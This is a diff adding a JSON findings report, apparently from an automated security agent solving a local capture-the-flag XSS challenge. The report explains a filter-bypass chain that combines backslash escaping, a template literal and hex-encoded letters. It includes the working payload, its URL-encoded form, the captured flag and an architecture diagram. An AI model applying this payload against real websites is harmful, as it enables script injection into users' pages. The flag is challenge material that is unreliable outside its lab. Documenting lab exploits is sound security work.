@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:07:34.215218+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "6c3a9c87-2ef1-46c7-bb3d-3f33c82b4874",
+      "timestamp": "2026-04-13T11:07:34.215111+00:00",
+      "title": "XSS Filter Bypass - JS String Escape + Template Literal (CTF Flag)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:44281/page?name=PAYLOAD",
+      "description": "The /page endpoint reflects the `name` parameter inside a JavaScript string: `var name = \"VALUE\"`. A WAF-like filter blocks: single quotes ('), uppercase letters (A-Z), and angle brackets (<). The server also escapes double-quote (\") to (\\\")\n\nBypass chain:\n1. Escape-the-escape: send backslash before the double-quote (\\\\\"): server escapes \" to \\\" but the preceding \\\\ becomes an escaped backslash in JS (\\\\\\\\), allowing the \" to terminate the string\n2. Template literal (backtick): use backtick instead of ' or \" for the alert argument\n3. Hex escape: use \\\\x58\\\\x53\\\\x53 instead of 'XSS' to avoid uppercase letters\n\nFinal payload: \\\\\"%;alert(`\\\\x58\\\\x53\\\\x53`)//\nURL: /page?name=%5C%22%3Balert%28%60%5Cx58%5Cx53%5Cx53%60%29%2F%2F",
+      "evidence": "Response body: Congratulations! Here is the flag: flag{82c40724-957f-4929-a7f0-beda740778d2}\n\nRendered JS in page: var name = \"\\\\\\\";alert(`\\x58\\x53\\x53`)//\"; document.write('Hello ' + name);\n\nThe template literal `\\x58\\x53\\x53` evaluates to 'XSS', triggering alert('XSS').",
+      "tool_used": "http_request",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "253ad3ed-db58-4aa0-aaf3-20ee5b62fd2b",
+      "timestamp": "2026-04-13T11:07:49.988170+00:00",
+      "title": "Dalgona XSS Challenge - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Home[\"GET / - Index Page\"]\n  Browser --> Page[\"GET /page?name=PAYLOAD - XSS Challenge\"]\n  Page --> Filter[\"Server-side Filter\\nBlocks: ' uppercase A-Z <\"]\n  Filter --> Escape[\"Server escapes \\\" to \\\\\\\"\"]\n  Escape --> JSTemplate[\"JS Template: var name = \\\"VALUE\\\"\"]\n  JSTemplate --> DocWrite[\"document.write('Hello ' + name)\"]\n  JSTemplate --> Bypass[\"Bypass: \\\\\\\" + backtick + hex escapes\"]\n  Bypass --> Flag[\"Flag: flag{82c40724-957f-4929-a7f0-beda740778d2}\"]"
+    }
+  ]
+}
